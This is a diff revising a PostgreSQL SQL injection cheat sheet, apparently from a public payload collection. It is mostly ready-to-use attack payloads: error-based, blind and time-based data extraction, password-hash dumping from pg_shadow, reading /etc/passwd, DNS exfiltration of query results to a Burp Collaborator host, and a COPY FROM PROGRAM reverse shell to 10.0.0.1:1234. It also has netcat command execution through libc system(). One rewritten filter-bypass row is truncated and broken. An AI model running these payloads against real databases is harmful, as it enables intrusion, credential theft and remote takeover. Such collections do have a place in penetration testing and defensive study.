@@ -1,6 +1,6 @@
 # PostgreSQL Injection
 
-> 
+> PostgreSQL SQL injection refers to a type of security vulnerability where attackers exploit improperly sanitized user input to execute unauthorized SQL commands within a PostgreSQL database.
 
 
 ## Summary
@@ -8,35 +8,33 @@
 * [PostgreSQL Comments](#postgresql-comments)
 * [PostgreSQL Version](#postgresql-version)
 * [PostgreSQL Current User](#postgresql-current-user)
-* [PostgreSQL List Users](#postgresql-list-users)
-* [PostgreSQL List Password Hashes](#postgresql-list-password-hashes)
-* [PostgreSQL List Database Administrator Accounts](#postgresql-list-database-administrator-accounts)
-* [PostgreSQL List Privileges](#postgresql-list-privileges)
-* [PostgreSQL Check if Current User is Superuser](#postgresql-check-if-current-user-is-superuser)
-* [PostgreSQL database name](#postgresql-database-name)
-* [PoStgresql List Databases](#postgresql-list-database)
-* [PostgreSQL List Tables](#postgresql-list-tables)
-* [PostgreSQL List Columns](#postgresql-list-columns)
+* [PostgreSQL Privileges](#postgresql-privileges)
+    * [PostgreSQL List Privileges](#postgresql-list-privileges)
+    * [PostgreSQL Superuser Role](#postgresql-superuser-role)
+* [PostgreSQL Enumeration](#postgresql-enumeration)
 * [PostgreSQL Error Based](#postgresql-error-based)
-* [PostgreSQL XML Helpers](#postgresql-xml-helpers)
+    * [PostgreSQL XML Helpers](#postgresql-xml-helpers)
 * [PostgreSQL Blind](#postgresql-blind)
 * [PostgreSQL Time Based](#postgresql-time-based)
+* [PostgreSQL Out of Band](#postgresql-out-of-band)
 * [PostgreSQL Stacked Query](#postgresql-stacked-query)
-* [PostgreSQL File Read](#postgresql-file-read)
-* [PostgreSQL File Write](#postgresql-file-write)
+* [PostgreSQL File Manipulation](#postgresql-file-manipulation)
+    * [PostgreSQL File Read](#postgresql-file-read)
+    * [PostgreSQL File Write](#postgresql-file-write)
 * [PostgreSQL Command Execution](#postgresql-command-execution)
-    * [CVE-2019–9193](#cve-20199193)
+    * [Using COPY TO/FROM PROGRAM](#using-copy-tofrom-program)
     * [Using libc.so.6](#using-libcso6)
-* [Bypass Filter](#bypass-filter)
+* [PostgreSQL WAF Bypass](#postgresql-waf-bypass)
+    * [Alternative to Quotes](#alternative-to-quotes)
 * [References](#references)
 
 
 ## PostgreSQL Comments
 
-```sql
---
-/**/  
-```
+| Type | Comment |
+| ---- | ------- |
+| Single-Line Comment | `--` |
+| Multi-Line Comment  | `/**/` |
 
 
 ## PostgreSQL Version
@@ -55,37 +53,18 @@ SELECT usename FROM pg_user;
 SELECT getpgusername();
 ```
 
-## PostgreSQL List Users
 
-```sql
-SELECT usename FROM pg_user
-```
+## PostgreSQL Privileges
 
-## PostgreSQL List Password Hashes
+### PostgreSQL List Privileges
 
-```sql
-SELECT usename, passwd FROM pg_shadow 
-```
+Retrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog` and `information_schema`.
 
-## PostgreSQL List Database Administrator Accounts
-
-```sql
-SELECT usename FROM pg_user WHERE usesuper IS TRUE
-```
-
-## PostgreSQL List Privileges
-
-Gather information from the [`pg_user`](https://www.postgresql.org/docs/current/view-pg-user.html) table:
-```sql
-SELECT * FROM pg_user
-```
-
-Retrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog` and `information_schema`:
 ```sql
 SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
 ```
 
-## PostgreSQL Check if Current User is Superuser
+### PostgreSQL Superuser Role
 
 ```sql
 SHOW is_superuser; 
@@ -93,29 +72,18 @@ SELECT current_setting('is_superuser');
 SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
 ```
 
-## PostgreSQL Database Name
+## PostgreSQL Enumeration
 
-```sql
-SELECT current_database()
-```
+| SQL Query                               | Description    |
+| --------------------------------------- | -------------- |
+| `SELECT current_database()`             | Database Name  |
+| `SELECT datname FROM pg_database`       | List Databases |
+| `SELECT table_name FROM information_schema.tables` | List Tables |
+| `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` | List Columns |
+| `SELECT usename FROM pg_user`           | List PostgreSQL Users |
+| `SELECT usename, passwd FROM pg_shadow` | List Password Hashes  |
+| `SELECT usename FROM pg_user WHERE usesuper IS TRUE` | List Database Administrator Accounts |
 
-## PostgreSQL List Database
-
-```sql
-SELECT datname FROM pg_database
-```
-
-## PostgreSQL List Tables
-
-```sql
-SELECT table_name FROM information_schema.tables
-```
-
-## PostgreSQL List Columns
-
-```sql
-SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
-```
 
 ## PostgreSQL Error Based
 
@@ -124,14 +92,16 @@ SELECT column_name FROM information_schema.columns WHERE table_name='data_table'
 ,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
 ,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
 ,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
+```
 
+```sql
 ' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
 ' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
 ' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
 ' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
 ```
 
-## PostgreSQL XML Helpers
+### PostgreSQL XML Helpers
 
 ```sql
 select query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
@@ -150,8 +120,8 @@ Note, with the above queries, the output needs to be assembled in memory. For la
 ## PostgreSQL Blind
 
 ```sql
-' and substr(version(),1,10) = 'PostgreSQL' and '1  -> OK
-' and substr(version(),1,10) = 'PostgreXXX' and '1  -> KO
+' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
+' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
 ```
 
 ## PostgreSQL Time Based
@@ -183,77 +153,108 @@ select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end
 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
 ```
 
-
 ```sql
 AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
 AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
 ```
+
+## PostgreSQL Out of Band
+
+Out-of-band SQL injections in PostgreSQL relies on the use of functions that can interact with the file system or network, such as `COPY`, `lo_export`, or functions from extensions that can perform network actions. The idea is to exploit the database to send data elsewhere, which the attacker can monitor and intercept. 
+
+```sql
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f();
+```
+
 
 ## PostgreSQL Stacked Query
 
 Use a semi-colon "`;`" to add another query
 
 ```sql
-http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--
+SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
 ```
 
 
-## PostgreSQL File Read
+## PostgreSQL File Manipulation
 
-```sql
-select pg_ls_dir('./');
-select pg_read_file('PG_VERSION', 0, 200);
-```
+### PostgreSQL File Read
 
-NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. Newer versions (as of [this](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.
+NOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. Newer versions (as of [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.
 
-```sql
-CREATE TABLE temp(t TEXT);
-COPY temp FROM '/etc/passwd';
-SELECT * FROM temp limit 1 offset 0;
-```
+* Using `pg_read_file`, `pg_ls_dir`
 
-```sql
-SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
-SELECT lo_get(16420); -- use the OID returned from the above
-SELECT * from pg_largeobject; -- or just get all the large objects and their data
-```
+    ```sql
+    select pg_ls_dir('./');
+    select pg_read_file('PG_VERSION', 0, 200);
+    ```
 
-## PostgreSQL File Write
+* Using `COPY`
 
-```sql
-CREATE TABLE pentestlab (t TEXT);
-INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
-SELECT * FROM pentestlab;
-COPY pentestlab(t) TO '/tmp/pentestlab';
-```
+    ```sql
+    CREATE TABLE temp(t TEXT);
+    COPY temp FROM '/etc/passwd';
+    SELECT * FROM temp limit 1 offset 0;
+    ```
 
-Or as one line:
-```sql
-COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
-```
+* Using `lo_import`
 
-```sql
-SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
-SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
-SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
-```
+    ```sql
+    SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
+    SELECT lo_get(16420); -- use the OID returned from the above
+    SELECT * from pg_largeobject; -- or just get all the large objects and their data
+    ```
+
+
+### PostgreSQL File Write
+
+* Using `COPY`
+
+    ```sql
+    CREATE TABLE nc (t TEXT);
+    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
+    SELECT * FROM nc;
+    COPY nc(t) TO '/tmp/nc.sh';
+    ```
+
+* Using `COPY` (one-line)
+
+    ```sql
+    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
+    ```
+
+* Using `lo_from_bytea`, `lo_put` and `lo_export`
+
+    ```sql
+    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
+    SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
+    SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
+    ```
+
 
 ## PostgreSQL Command Execution
 
-### CVE-2019–9193
+### Using COPY TO/FROM PROGRAM
 
-Can be used from [Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598) if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. 
+Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.
 
-```SQL
-DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
-CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
-COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
-SELECT * FROM cmd_exec;                 -- [Optional] View the results
-DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
+```sql
+COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
 ```
 
-![https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png](https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png)
+```sql
+CREATE TABLE shell(output text);
+COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
+```
+
 
 ### Using libc.so.6
 
@@ -262,22 +263,15 @@ CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu
 SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
 ```
 
-### Bypass Filter
 
-#### Quotes
+### PostgreSQL WAF Bypass
 
-Using CHR
+#### Alternative to Quotes
 
-```sql
-SELECT CHR(65)||CHR(66)||CHR(67);
-```
-
-Using Dollar-signs  ( >= version 8 PostgreSQL)
-
-```sql
-SELECT $$This is a string$$
-SELECT $TAG$This is another string$TAG$
-```
+| Payload            | Technique |
+| ------------------ | --------- |
+| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()` |
+| `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |
 
 
 ## References
